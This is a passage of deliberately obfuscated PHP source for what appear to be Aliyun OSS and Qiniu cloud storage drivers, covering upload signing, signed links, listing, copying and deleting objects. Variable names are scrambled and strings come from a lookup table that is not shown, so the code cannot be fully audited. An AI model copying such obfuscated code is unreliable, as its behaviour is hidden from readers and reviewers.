$ÌÓÓÊÔŠ, $‡ÁŒ‡[1437] => $this->accessKey, $‡ÁŒ‡[1340] => $‡ÁŒ‡[1332], $‡ÁŒ‡[1438] => $ø˜ äı, $‡ÁŒ‡[181] => $–¸ŒÙ˜€); $ûæ¬šƒã = $this->trafficLimit($‡ÁŒ‡[1431], $ûæ¬šƒã); return $ûæ¬šƒã; } public function multiUploadFormData($‹‰„§û£, $¢ùƒí¸ = 3600) { $ŒØÉì¼ =& $_SERVER[ä¿÷‹µ±]; if (!($Ò˜ßãö‘ = $this->getHost())) { return !1; } $èÑù¬¯Œ = $this->trafficLimit($ŒØÉì¼[1431]); $¤—ú÷·£ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‹‰„§û£), $èÑù¬¯Œ); return array($ŒØÉì¼[223] => $¤—ú÷·£, $ŒØÉì¼[181] => $Ò˜ßãö‘ . $ŒØÉì¼[8] . $this->pathEncode($‹‰„§û£), $ŒØÉì¼[224] => gmdate($ŒØÉì¼[1439]), $ŒØÉì¼[94] => $‹‰„§û£); } public function multiUploadAuthData($¥„êÈš£, $Ìİ’¾Ğä = array()) { $Ô¶õïÜ’ =& $_SERVER[ä¿÷‹µ±]; $ÖÑŒò²í = isset($Ìİ’¾Ğä[$Ô¶õïÜ’[224]]) ? $Ìİ’¾Ğä[$Ô¶õïÜ’[224]] : gmdate($Ô¶õïÜ’[1439]); $ê°‹©´ = isset($Ìİ’¾Ğä[$Ô¶õïÜ’[174]]) ? $Ìİ’¾Ğä[$Ô¶õïÜ’[174]] : $Ô¶õïÜ’[12]; $ÃßÆ´§İ = $¥„êÈš£; if (isset($Ìİ’¾Ğä[$Ô¶õïÜ’[94]])) { $ÃßÆ´§İ = $Ìİ’¾Ğä[$Ô¶õïÜ’[94]]; unset($Ìİ’¾Ğä[$Ô¶õïÜ’[94]]); } if (isset($Ìİ’¾Ğä[$Ô¶õïÜ’[225]])) { $Ìİ’¾Ğä[$Ô¶õïÜ’[224]] = $ÖÑŒò²í; return $this->listUploadParts($ÃßÆ´§İ, $Ìİ’¾Ğä); } $³Ÿ”„ÍÛ = array($Ô¶õïÜ’[226], $Ô¶õïÜ’[12], $Ô¶õïÜ’[120], $ÖÑŒò²í, "\170\55\157\163\x73\55\144\141\164\x65\x3a{$ÖÑŒò²í}", $Ô¶õïÜ’[8] . $this->bucket . $Ô¶õïÜ’[8] . $ÃßÆ´§İ . $ê°‹©´); if (strpos($ê°‹©´, $Ô¶õïÜ’[227]) === 0) { $³Ÿ”„ÍÛ[0] = $Ô¶õïÜ’[228]; if ($é‹Éüò± = $this->trafficLimit($Ô¶õïÜ’[1431])) { $ÃßÆ´§İ = $Ô¶õïÜ’[1440]; array_splice($³Ÿ”„ÍÛ, 5, 0, $ÃßÆ´§İ . $Ô¶õïÜ’[4] . $é‹Éüò±[$ÃßÆ´§İ]); } } if (isset($Ìİ’¾Ğä[$Ô¶õïÜ’[229]]) && $Ìİ’¾Ğä[$Ô¶õïÜ’[229]] == $Ô¶õïÜ’[230]) { $³Ÿ”„ÍÛ[0] = $Ô¶õïÜ’[230]; } if (!empty($Ìİ’¾Ğä[$Ô¶õïÜ’[1441]])) { $­®ÄÎØÆ = array_merge(array($³Ÿ”„ÍÛ[4]), $Ìİ’¾Ğä[$Ô¶õïÜ’[1441]]); sort($­®ÄÎØÆ); $³Ÿ”„ÍÛ[4] = implode($Ô¶õïÜ’[231], $­®ÄÎØÆ); } $ËŞ˜¸Ú¨ = implode($Ô¶õïÜ’[231], $³Ÿ”„ÍÛ); $Ï‰áŠğÇ = base64_encode(hash_hmac($Ô¶õïÜ’[232], $ËŞ˜¸Ú¨, $this->secret, !0)); $“ÎÈõ¾° = $Ô¶õïÜ’[1405] . $this->accessKey . $Ô¶õïÜ’[4] . $Ï‰áŠğÇ; if (strpos($ê°‹©´, $Ô¶õïÜ’[227]) === 0) { $“ÎÈõ¾° = array($Ô¶õïÜ’[234] => $“ÎÈõ¾°, $Ô¶õïÜ’[224] => $ÖÑŒò²í); if ($é‹Éüò±) { $“ÎÈõ¾° = array_merge($“ÎÈõ¾°, $é‹Éüò±); } } return $“ÎÈõ¾°; } public function listUploadParts($ï°²ÉÜÈ, $†”’ñşø) { $ğÌÇ—ÓÅ =& $_SERVER[ä¿÷‹µ±]; $¬ü—Í¥° = parse_url_query($†”’ñşø[$ğÌÇ—ÓÅ[174]]); $Êæé”¥¾ = $this->client->listParts($this->bucket, $this->pathEncode($ï°²ÉÜÈ), $¬ü—Í¥°[$ğÌÇ—ÓÅ[223]]); $¾ıœÌËŸ = $Êæé”¥¾->getListPart(); $ÍÏ¡¯Àï = array(); foreach ($¾ıœÌËŸ as $“µÌùÕ½) { $ÍÏ¡¯Àï[] = array($ğÌÇ—ÓÅ[1425] => $“µÌùÕ½->getPartNumber(), $ğÌÇ—ÓÅ[1426] => trim($“µÌùÕ½->getETag(), $ğÌÇ—ÓÅ[118])); } unset($†”’ñşø[$ğÌÇ—ÓÅ[225]], $†”’ñşø[$ğÌÇ—ÓÅ[229]]); $ıµÍú„ = $this->multiUploadAuthData($ï°²ÉÜÈ, $†”’ñşø); if (empty($ıµÍú„)) { return !1; } return array($ğÌÇ—ÓÅ[234] => $ıµÍú„, $ğÌÇ—ÓÅ[224] => $†”’ñşø[$ğÌÇ—ÓÅ[224]], $ğÌÇ—ÓÅ[236] => $ÍÏ¡¯Àï); } public function download($è€ú‡ˆæ, $Ô£˜„Ì) { if ($this->isFolder($è€ú‡ˆæ)) { return !1; } try { $´Š¹ÑñÁ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ô£˜„Ì); $´Š¹ÑñÁ = $this->trafficLimit($_SERVER[ä¿÷‹µ±][109], $´Š¹ÑñÁ); $this->client->getObject($this->bucket, $this->pathEncode($è€ú‡ˆæ), $´Š¹ÑñÁ); } catch (OSS\Core\OssException $¼º¦”ÎÚ) { return !1; } return $Ô£˜„Ì; } public function fileSubstr($åÉ—ë™ƒ, $£ÊÕÀß = 0, $ÌÆ‘âøÂ = false) { if ($£ÊÕÀß === -1) { $Ò¾‰Ôé· = array(); } else { if ($ÌÆ‘âøÂ === !1) { $ÂÄİú = $this->size($åÉ—ë™ƒ); } else { $ÂÄİú = $£ÊÕÀß + $ÌÆ‘âøÂ - 1; } $Ò¾‰Ôé· = array(OSS\OssClient::OSS_RANGE => "{$£ÊÕÀß}\x2d{$ÂÄİú}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($åÉ—ë™ƒ), $Ò¾‰Ôé·); } catch (OSS\Core\OssException $ß³²ŸòÀ) { think_exception($ß³²ŸòÀ->getMessage()); return !1; } } private function trafficLimit($­·“‚ , $ÅÒ³ãóö = array()) { $ÑŞùÎœı =& $_SERVER[ä¿÷‹µ±]; if ($­·“‚  == $ÑŞùÎœı[1431] && $this->isUploadServer() || $­·“‚  == $ÑŞùÎœı[109] && $this->isFileOutServer()) { return $ÅÒ³ãóö; } $¹–ÜÌÚ¡ = floatval($GLOBALS[$ÑŞùÎœı[6]][$ÑŞùÎœı[89]][$ÑŞùÎœı[107]][$­·“‚ ]) * 1024 * 1024 * 8; if (!$¹–ÜÌÚ¡) { return $ÅÒ³ãóö; } $¹–ÜÌÚ¡ = $¹–ÜÌÚ¡ < 819200 ? 819200 : ($¹–ÜÌÚ¡ > 838860800 ? 838860800 : $¹–ÜÌÚ¡); $ÅÒ³ãóö[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¹–ÜÌÚ¡); return $ÅÒ³ãóö; } public function link($ÔÎ”ñ, $¤¸»Æ²ö = array()) { $ƒß–Ö×€ =& $_SERVER[ä¿÷‹µ±]; if (!$this->exist($ÔÎ”ñ) || $this->isFolder($ÔÎ”ñ)) { return !1; } try { $¤¸»Æ²ö = $this->trafficLimit($ƒß–Ö×€[109], $¤¸»Æ²ö); $×èû‡¸Á = $this->client->signUrl($this->bucket, $this->pathEncode($ÔÎ”ñ), 3600 * 12, $ƒß–Ö×€[230], $¤¸»Æ²ö); return $this->getCdnLink($×èû‡¸Á); } catch (OSS\Core\OssException $©©á¸ôÚ) { return !1; } } public function fileOut($²ƒâ‘Å, $ÀãŸ‹Ú• = false, $ÊÆôÎÂ = false, $Œ¼š…‰× = '') { $¶…¸×ï’ =& $_SERVER[ä¿÷‹µ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($²ƒâ‘Å, $ÀãŸ‹Ú•, $ÊÆôÎÂ, $Œ¼š…‰×); } if (!$ÊÆôÎÂ) { $ÊÆôÎÂ = $this->pathThis($²ƒâ‘Å); } $ÊÆôÎÂ = rawurlencode($ÊÆôÎÂ); $úŞó©º = get_file_mime(get_path_ext($ÊÆôÎÂ)); if ($úŞó©º == $¶…¸×ï’[217]) { return parent::fileOut($²ƒâ‘Å, $ÀãŸ‹Ú•, $ÊÆôÎÂ, $Œ¼š…‰×); } $ÀãŸ‹Ú• = $ÀãŸ‹Ú• ? $¶…¸×ï’[1442] : $¶…¸×ï’[1443]; $áèï’›³ = array(OSS\OssClient::OSS_SUB_RESOURCE => $¶…¸×ï’[1444] . rawurlencode("{$ÀãŸ‹Ú•}\x3b\x66\x69\x6c\145\156\141\x6d\145\75{$ÊÆôÎÂ}")); $áèï’›³[OSS\OssClient::OSS_SUB_RESOURCE] .= $¶…¸×ï’[1445] . rawurlencode($úŞó©º); $°’Éşè = $this->link($²ƒâ‘Å, $áèï’›³); $this->fileOutLink($°’Éşè); } public function fileOutServer($¥Ò”´ÄÂ, $“Æ¼™¢› = false, $‘Û†üï  = false, $«ğ“øŠ = '') { parent::fileOut($¥Ò”´ÄÂ, $“Æ¼™¢›, $‘Û†üï , $«ğ“øŠ); } public function fileOutImage($ô«Å—÷ğ, $¦ÖİÓªé = 250) { $ñï¹êæ  = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ä¿÷‹µ±][1446] . $¦ÖİÓªé); $¿†’Ş®¸ = $this->link($ô«Å—÷ğ, $ñï¹êæ ); $this->fileOutLink($¿†’Ş®¸); } public function fileOutImageServer($Ñº••çâ, $Æ ĞÅŞ£ = 250) { parent::fileOutImage($Ñº••çâ, $Æ ĞÅŞ£); } public function fileOutLink($ÏÅ¶ƒ’) { $ºÖÓƒ´„ =& $_SERVER[ä¿÷‹µ±]; if (!$this->isCdnHost() && substr($ÏÅ¶ƒ’, 0, 7) == $ºÖÓƒ´„[1347]) { $ÏÅ¶ƒ’ = $ºÖÓƒ´„[1348] . substr($ÏÅ¶ƒ’, 7); } header($ºÖÓƒ´„[161] . $ÏÅ¶ƒ’); die; } public function hashMd5($‘ËŸ‚ÂÙ, $º÷˜¼¡… = '') { $Çˆ¿§®ã =& $_SERVER[ä¿÷‹µ±]; $ÕĞËİ‘Á = $this->_objectMeta($‘ËŸ‚ÂÙ); if (!$ÕĞËİ‘Á) { return $Çˆ¿§®ã[12]; } if (!isset($ÕĞËİ‘Á[$Çˆ¿§®ã[1421]]) && !empty($º÷˜¼¡…)) { $¹´ÏÍ¨Ü = $this->updateObjMeta($‘ËŸ‚ÂÙ, array($Çˆ¿§®ã[1421] => $º÷˜¼¡…)); $ÕĞËİ‘Á[$Çˆ¿§®ã[1421]] = $¹´ÏÍ¨Ü ? $º÷˜¼¡… : $Çˆ¿§®ã[12]; } return isset($ÕĞËİ‘Á[$Çˆ¿§®ã[1421]]) ? strtolower($ÕĞËİ‘Á[$Çˆ¿§®ã[1421]]) : $Çˆ¿§®ã[12]; } public function size($ È”àœ—) { $Ğ¥©ŞÓ = $this->objectMeta($ È”àœ—); return $Ğ¥©ŞÓ ? $Ğ¥©ŞÓ[$_SERVER[ä¿÷‹µ±][76]] : 0; } public function info($Ïíø­àŠ) { if ($this->isFolder($Ïíø­àŠ)) { return $this->folderInfo($Ïíø­àŠ); } else { if ($this->isFile($Ïíø­àŠ)) { return $this->fileInfo($Ïíø­àŠ); } } return !1; } public function exist($¨Šõßç) { return $this->isFile($¨Šõßç) || $this->isFolder($¨Šõßç); } public function isFile($üªâî•—) { return !$this->isFolder($üªâî•—) && $this->objectMeta($üªâî•—); } public function isFolder($ÍÛÓéß§) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][165], $ÍÛÓéß§); } protected function objectMeta($Ôë®±€ú) { return $this->cacheMethod($_SERVER[ä¿÷‹µ±][167], $Ôë®±€ú); } protected function _objectMeta($‡ÜùŒÄ˜) { $ù¼‹˜Á =& $_SERVER[ä¿÷‹µ±]; try { $Êğ¦ç·Ô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($‡ÜùŒÄ˜)); } catch (OSS\Core\OssException $Ùòªñ) { $Êğ¦ç·Ô = !1; } if ($Êğ¦ç·Ô) { $Êğ¦ç·Ô[$ù¼‹˜Á[76]] = intval($Êğ¦ç·Ô[$ù¼‹˜Á[1419]]); } return $Êğ¦ç·Ô; } protected function _isFolder($œŠŒª) { $³µÜ‡ Ä =& $_SERVER[ä¿÷‹µ±]; if ($œŠŒª == $³µÜ‡ Ä[12] || $œŠŒª == $³µÜ‡ Ä[8]) { return !0; } $çÛĞû = array($³µÜ‡ Ä[1415] => $³µÜ‡ Ä[8], $³µÜ‡ Ä[1416] => rtrim($œŠŒª, $³µÜ‡ Ä[8]) . $³µÜ‡ Ä[8], $³µÜ‡ Ä[1417] => 1, $³µÜ‡ Ä[1418] => $³µÜ‡ Ä[12]); $úÄ©×Æû = $this->client->listObjects($this->bucket, $çÛĞû); if ($úÄ©×Æû->getObjectList() || $úÄ©×Æû->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($±ã—ÆÏĞ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ä¿÷‹µ±][1447]; $this->_init($±ã—ÆÏĞ); } public function _init($¶»°‡Ñú) { $äÍŞØíÎ =& $_SERVER[ä¿÷‹µ±]; foreach ($¶»°‡Ñú as $¶Øı Œè => $ƒÑÑÓú…) { if (isset($this->{$¶Øı Œè})) { $this->{$¶Øı Œè} = $ƒÑÑÓú…; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($äÍŞØíÎ[1448] . LNG($äÍŞØíÎ[1406])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ˆ¿âàµ³, $¬·¯—öÆ = '', $éÖÕæ‰ = REPEAT_RENAME) { if ($this->setContent($ˆ¿âàµ³, $¬·¯—öÆ)) { return $this->getPathOuter($ˆ¿âàµ³); } return !1; } public function mkdir($‰º–º¼À, $„Ù½•¨ = REPEAT_SKIP) { $Ñ®ñÛãà =& $_SERVER[ä¿÷‹µ±]; $°‚Ö¯ùÌ = trim($‰º–º¼À, $Ñ®ñÛãà[8]); if ($this->_isFolder($°‚Ö¯ùÌ)) { return $this->getPathOuter($°‚Ö¯ùÌ); } $‰º–º¼À = $°‚Ö¯ùÌ . $Ñ®ñÛãà[8]; $¿’±ìŠ = get_path_this($°‚Ö¯ùÌ); $ÌÑË‚Àš = $‰º–º¼À . $¿’±ìŠ; if (!$this->mkfile($ÌÑË‚Àš)) { return !1; } if (!$this->moveFile($ÌÑË‚Àš, $‰º–º¼À)) { $this->delFile($ÌÑË‚Àš); return !1; } return $this->getPathOuter($°‚Ö¯ùÌ); } public function copyFile($§åÍ¸Ò, $èéÈó) { $ÜµıáÒé = $this->bucketManager->copy($this->bucket, $§åÍ¸Ò, $this->bucket, $èéÈó, !0); return $ÜµıáÒé ? !1 : $this->getPathOuter($èéÈó); } public function moveFile($±ó¤¬‹ñ, $ÀÒ¦ÁŒ¥) { $€¨›÷¢ = $this->bucketManager->move($this->bucket, $±ó¤¬‹ñ, $this->bucket, $ÀÒ¦ÁŒ¥, !0); return $€¨›÷¢ ? !1 : $this->getPathOuter($ÀÒ¦ÁŒ¥); } public function delFile($¥ÜÑîîı) { if (!$this->exist($¥ÜÑîîı)) { return !0; } $¥ï§ = $this->bucketManager->delete($this->bucket, $¥ÜÑîîı); return $¥ï§ ? !1 : !0; } public function delFolder($ÕçŸÇ£—) { $”¸¡àâ =& $_SERVER[ä¿÷‹µ±]; if (!$this->exist($ÕçŸÇ£—)) { return !0; } $this->listItemCache = !1; $òÔË…ÁŞ = $this->fileList($ÕçŸÇ£—); $this->listItemCache = !0; $½ ù‚° = trim($ÕçŸÇ£—, $”¸¡àâ[8]) . $”¸¡àâ[8]; if (!empty($ÕçŸÇ£—) && $ÕçŸÇ£— !== $”¸¡àâ[197] && !in_array($½ ù‚°, $òÔË…ÁŞ[$”¸¡àâ[82]])) { $òÔË…ÁŞ[$”¸¡àâ[82]][] = $½ ù‚°; } $ó½ë¦²µ = $this->delByBatch($òÔË…ÁŞ[$”¸¡àâ[83]]); if (!$ó½ë¦²µ) { return !1; } $ó½ë¦²µ = $this->delByBatch($òÔË…ÁŞ[$”¸¡àâ[82]]); if (!$ó½ë¦²µ) { return !1; } return $this->delFile($½ ù‚°); } private function delByBatch($šò·¹‰ã) { foreach (array_chunk($šò·¹‰ã, 1000) as $Û½ó²ü€) { $î²üıÄÜ = $this->bucketManager->buildBatchDelete($this->bucket, $Û½ó²ü€); list($è÷ˆŸÉÌ, $ñÌ´‚ñ–) = $this->bucketManager->batch($î²üıÄÜ); if ($ñÌ´‚ñ–) { return !1; } } return !0; } public function rename($®Ó‘¤´ç, $Ò³®ôèã) { return $this->renameObject($®Ó‘¤´ç, $Ò³®ôèã); } public function fileInfo($‡“„†Ù›, $Õ¸‚÷ã¤ = false, $§Îø¦Ã£ = array()) { $¶Íè÷ê =& $_SERVER[ä¿÷‹µ±]; $‰‡–ù = array($¶Íè÷ê[32] => $this->pathThis($‡“„†Ù›), $¶Íè÷ê[84] => $this->getPathOuter($¶Íè÷ê[8] . $‡“„†Ù›), $¶Íè÷ê[33] => $¶Íè÷ê[199], $¶Íè÷ê[76] => isset($§Îø¦Ã£[$¶Íè÷ê[1449]]) ? $§Îø¦Ã£[$¶Íè÷ê[1449]] : 0, $¶Íè÷ê[174] => $this->ext($‡“„†Ù›)); if ($Õ¸‚÷ã¤) { return $‰‡–ù; } $‰‡–ù[$¶Íè÷ê[200]] = $‰‡–ù[$¶Íè÷ê[85]] = 0; $‰‡–ù[$¶Íè÷ê[201]] = $‰‡–ù[$¶Íè÷ê[202]] = !0; if (empty($§Îø¦Ã£)) { $§Îø¦Ã£ = $this->objectMeta($‡“„†Ù›); if (!$§Îø¦Ã£) { return $‰‡–ù; } } if (isset($§Îø¦Ã£[$¶Íè÷ê[1450]])) { $‰‡–ù[$¶Íè÷ê[85]] = substr($§Îø¦Ã£[$¶Íè÷ê[1450]] . $¶Íè÷ê[12], 0, 10); } if (isset($§Îø¦Ã£[$¶Íè÷ê[1449]])) { $‰‡–ù[$¶Íè÷ê[76]] = $§Îø¦Ã£[$¶Íè÷ê[1449]]; } return $‰‡–ù; } public function folderInfo($¢ÊĞïÆÃ, $Çıµä³ = false) { $€Ì™üÆõ =& $_SERVER[ä¿÷‹µ±]; $Ë¦È•Ùü = array($€Ì™üÆõ[32] => $this->pathThis($¢ÊĞïÆÃ), $€Ì™üÆõ[84] => $this->getPathOuter($€Ì™üÆõ[8] . $¢ÊĞïÆÃ), $€Ì™üÆõ[33] => $€Ì™üÆõ[75]); if ($Çıµä³) { return $Ë¦È•Ùü; } $Ë¦È•Ùü[$€Ì™üÆõ[200]] = $Ë¦È•Ùü[$€Ì™üÆõ[85]] = 0; $Ë¦È•Ùü[$€Ì™üÆõ[201]] = $Ë¦È•Ùü[$€Ì™üÆõ[202]] = !0; $¢ÊĞïÆÃ = rtrim($¢ÊĞïÆÃ, $€Ì™üÆõ[8]) . $€Ì™üÆõ[8]; $£èÂõïæ = $this->objectMeta($¢ÊĞïÆÃ); if (isset($£èÂõïæ[$€Ì™üÆõ[1450]])) { $Ë¦È•Ùü[$€Ì™üÆõ[85]] = substr($£èÂõïæ[$€Ì™üÆõ[1450]] . $€Ì™üÆõ[12], 0, 10); } return $Ë¦È•Ùü; } public function listPath($óÔ÷ÄÔ¨, $Œë»£Šª = false) { $±Şõ­º˜ =& $_SERVER[ä¿÷‹µ±]; $ØÉ“«Ô = $this->fileList($óÔ÷ÄÔ¨, $±Şõ­º˜[8], !0); foreach ($ØÉ“«Ô[$±Şõ­º˜[82]] as $ã‰çÛ³ => $ î‰Æ•æ) { $ØÉ“«Ô[$±Şõ­º˜[82]][$ã‰çÛ³] = $this->folderInfo($ î‰Æ•æ, $Œë»£Šª); } foreach ($ØÉ“«Ô[$±Şõ­º˜[83]] as $ã‰çÛ³ => $ î‰Æ•æ) { $ØÉ“«Ô[$±Şõ­º˜[83]][$ã‰çÛ³] = $this->fileInfo($ î‰Æ•æ[$±Şõ­º˜[94]], $Œë»£Šª, $ î‰Æ•æ); } return $ØÉ“«Ô; } public function has($è‡ÕÔâ, $“‘ü±úÓ = false, $æ­Ñ£œ = true) { $²ïşŒ¤œ =& $_SERVER[ä¿÷‹µ±]; $è‡ÕÔâ = trim($è‡ÕÔâ, $²ïşŒ¤œ[8]); $öûõºÊ = empty($è‡ÕÔâ) && $è‡ÕÔâ !== $²ïşŒ¤œ[197] ? $²ïşŒ¤œ[12] : $è‡ÕÔâ . $²ïşŒ¤œ[8]; $ë¹èæ¥¿ = $²ïşŒ¤œ[12]; $¢Ëúûê = 500; $¢µ‹¥Ùû = $²ïşŒ¤œ[8]; $˜òèÎïÚ = $æ¹Ï­“ = 0; while (!0) { check_abort(); list($á¦¥ÉÏß, $ÌÎ¼æÎû) = $this->bucketManager->listFiles($this->bucket, $öûõºÊ, $ë¹èæ¥¿, $¢Ëúûê, $¢µ‹¥Ùû); if ($ÌÎ¼æÎû) { break; } $ë¹èæ¥¿ = array_key_exists($²ïşŒ¤œ[1418], $á¦¥ÉÏß) ? $ë¹èæ¥¿ = $á¦¥ÉÏß[$²ïşŒ¤œ[1451]] : $²ïşŒ¤œ[12]; if ($“‘ü±úÓ) { if (!empty($á¦¥ÉÏß[$²ïşŒ¤œ[1452]])) { $˜òèÎïÚ += count($á¦¥ÉÏß[$²ïşŒ¤œ[1452]]); } if (!empty($á¦¥ÉÏß[$²ïşŒ¤œ[1453]])) { $æ¹Ï­“ += count($á¦¥ÉÏß[$²ïşŒ¤œ[1453]]); } if ($ë¹èæ¥¿ === $²ïşŒ¤œ[12]) { break; } continue; } if ($æ­Ñ£œ) { if (!empty($á¦¥ÉÏß[$²ïşŒ¤œ[1452]])) { return !0; } } else { if (!empty($á¦¥ÉÏß[$²ïşŒ¤œ[1453]])) { return !0; } } if ($ë¹èæ¥¿ === $²ïşŒ¤œ[12]) { break; } } if ($“‘ü±úÓ) { return array($²ïşŒ¤œ[207] => $˜òèÎïÚ, $²ïşŒ¤œ[208] => $æ¹Ï­“); } return !1; } public function listAll($”ŒºÒ¾—) { $×ö¬ ØÃ =& $_SERVER[ä¿÷‹µ±]; $ì¤Í¨ˆî = $this->fileList($”ŒºÒ¾—, $×ö¬ ØÃ[12], !0); $Åèê‡ï = array(); foreach ($ì¤Í¨ˆî[$×ö¬ ØÃ[83]] as $”Ì¾ª£“) { $Åèê‡ï[$”Ì¾ª£“[$×ö¬ ØÃ[94]]] = $”Ì¾ª£“[$×ö¬ ØÃ[76]]; } foreach ($ì¤Í¨ˆî[$×ö¬ ØÃ[82]] as $”Ì¾ª£“) { if (is_string($”Ì¾ª£“)) { $Åèê‡ï[$”Ì¾ª£“] = 0; } } return $this->listAllFiles($”ŒºÒ¾—, array_keys($Åèê‡ï), $Åèê‡ï); } private function fileList($şÛûÊğÊ, $ÔŒàšŞô = '', $ò²ˆ° = 0) { $ğ÷“ÄªÏ =& $_SERVER[ä¿÷‹µ±]; $şÛûÊğÊ = trim($şÛûÊğÊ, $ğ÷“ÄªÏ[8]); $İÏ§†‹û = empty($şÛûÊğÊ) && $şÛûÊğÊ !== $ğ÷“ÄªÏ[197] ? $ğ÷“ÄªÏ[12] : $şÛûÊğÊ . $ğ÷“ÄªÏ[8]; $Åè‚ıÙœ = $ğ÷“ÄªÏ[12]; $“×ªèï· = 1000; $Ê½ñÏ« = $­í­ûœŸ = array(); while (!0) { check_abort(); list($şã·°öÓ, $ì¥€¥ˆØ) = $this->bucketManager->listFiles($this->bucket, $İÏ§†‹û, $Åè‚ıÙœ, $“×ªèï·, $ÔŒàšŞô); if ($ì¥€¥ˆØ) { break; } $Åè‚ıÙœ = array_key_exists($ğ÷“ÄªÏ[1418], $şã·°öÓ) ? $Åè‚ıÙœ = $şã·°öÓ[$ğ÷“ÄªÏ[1451]] : $ğ÷“ÄªÏ[12]; $¯€¾…€ = isset($şã·°öÓ[$ğ÷“ÄªÏ[1452]]) ? $şã·°öÓ[$ğ÷“ÄªÏ[1452]] : array(); $€ñ¢Ñ¡£ = isset($şã·°öÓ[$ğ÷“ÄªÏ[1453]]) ? $şã·°öÓ[$ğ÷“ÄªÏ[1453]] : array(); foreach ($¯€¾…€ as $öÑã¢¥Ï) { if ($öÑã¢¥Ï[$ğ÷“ÄªÏ[94]] == $İÏ§†‹û) { continue; } $ü½¼­ñ = $öÑã¢¥Ï[$ğ÷“ÄªÏ[94]]; $¶‚Ö¿¶’ = $öÑã¢¥Ï[$ğ÷“ÄªÏ[1449]]; $öÑã¢¥Ï[$ğ÷“ÄªÏ[76]] = $¶‚Ö¿¶’; $Ã—¨“¦´ = $¶‚Ö¿¶’ == 0 && substr($ü½¼­ñ, strlen($ü½¼­ñ) - 1, 1) == $ğ÷“ÄªÏ[8] ? !0 : !1; $this->cacheMethodInfoSet($ü½¼­ñ, $Ã—¨“¦´, $öÑã¢¥Ï); if ($Ã—¨“¦´) { $Ê½ñÏ«[] = $ü½¼­ñ; continue; } $­í­ûœŸ[] = $ò²ˆ° ? $öÑã¢¥Ï : $ü½¼­ñ; } foreach ($€ñ¢Ñ¡£ as $ü½¼­ñ) { if ($ü½¼­ñ == $İÏ§†‹û) { continue; } $Ê½ñÏ«[] = $ü½¼­ñ; $this->cacheMethodInfoSet($ü½¼­ñ, !0); } if ($Åè‚ıÙœ === $ğ÷“ÄªÏ[12]) { break; } } $this->cacheMethodInfoSet($şÛûÊğÊ, !0); return array($ğ÷“ÄªÏ[82] => $Ê½ñÏ«, $ğ÷“ÄªÏ[83] => $­í­ûœŸ); } public function canRead($ŸçôöÎ¡) { return $this->exist($ŸçôöÎ¡) ? !0 : !1; } public function canWrite($øÎ¨–Åß) { return $this->exist($øÎ¨–Åß) ? !0 : !1; } public function getContent($ò«®é‚ş) { return $this->fileSubstr($ò«®é‚ş, 0, -1); } public function setContent($óŸñŞÈÍ, $öì¤åÀ = '') { $œü•âªÃ = $this->tempFile($this->pathThis($óŸñŞÈÍ)); file_put_contents($œü•âªÃ, $öì¤åÀ); if ($this->upload($óŸñŞÈÍ, $œü•âªÃ)) { $this->tempFileRemve($œü•âªÃ); return !0; } return !1; } public function refreshUrls($ºíğûı¦) { $ì»ëŠ³ =& $_SERVER[ä¿÷‹µ±]; $ä›ô€˜Ã = array(); if (is_array($ºíğûı¦)) { foreach ($ºíğûı¦ as $Ú×‰òê…) { $ä›ô€˜Ã[] = $this->link($Ú×‰òê…); } } else { $ä›ô€˜Ã[] = $this->link($ºíğûı¦); } $ß¥©û«Ñ = new Qiniu\Cdn\CdnManager($this->auth); list($Ì…¸Ã‡, $È¡Ç§Õ) = $ß¥©û«Ñ->refreshUrls($ä›ô€˜Ã); if ($È¡Ç§Õ) { return !1; } return $Ì…¸Ã‡[$ì»ëŠ³[1205]] == $ì»ëŠ³[779] ? !0 : !1; } public function fileSubstr($ÈÂ–éğ“, $¨âº€€š, $öäŠ³ò) { $úïäÏ°† =& $_SERVER[ä¿÷‹µ±]; if (!($®óëÌ¾’ = $this->link($ÈÂ–éğ“))) { return !1; } $‡®õÍ“† = !1; if ($öäŠ³ò > 0) { $Î±ÓÊ… = $¨âº€€š + $öäŠ³ò - 1; $‡®õÍ“† = array($úïäÏ°†[1454] . $¨âº€€š . $úïäÏ°†[386] . $Î±ÓÊ…); } $‚ÊÒãÙ¸ = url_request($®óëÌ¾’, $úïäÏ°†[230], !1, $‡®õÍ“†); return $‚ÊÒãÙ¸[$úïäÏ°†[769]] ? $‚ÊÒãÙ¸[$úïäÏ°†[1215]] : !1; } public function upload($•é¿üıÑ, $•Äã¯îÕ, $ˆÁÓº = false, $¼×Ğ£ƒø = REPEAT_REPLACE) { $ãï”£ÖÕ = new Qiniu\Storage\UploadManager(); $Û·¿´€” = $this->auth->uploadToken($this->bucket, $•é¿üıÑ); $ÖİêÑª = get_file_mime(get_path_ext($•Äã¯îÕ)); list($§İ‡‰¡Ä, $¸ëä…ôİ) = $ãï”£ÖÕ->putFile($Û·¿´€”, $•é¿üıÑ, $•Äã¯îÕ, null, $ÖİêÑª); return $¸ëä…ôİ ? !1 : $this->getPathOuter($•é¿üıÑ); } public function uploadFormData($™¿Õ—‚, $™éËùµö = 3600) { return $this->uploadToken($™¿Õ—‚, $™éËùµö); } public function multiUploadFormData($ÂŞ²Ñî„, $¸Â˜–×¬ = 3600) { return $this->uploadToken($ÂŞ²Ñî„, $¸Â˜–×¬); } private function uploadToken($ÌÙ±†ïì, $ÚÔÑ–•· = 3600) { $³ÙÆÔ‚Æ =& $_SERVER[ä¿÷‹µ±]; $¢×Òô¡° = 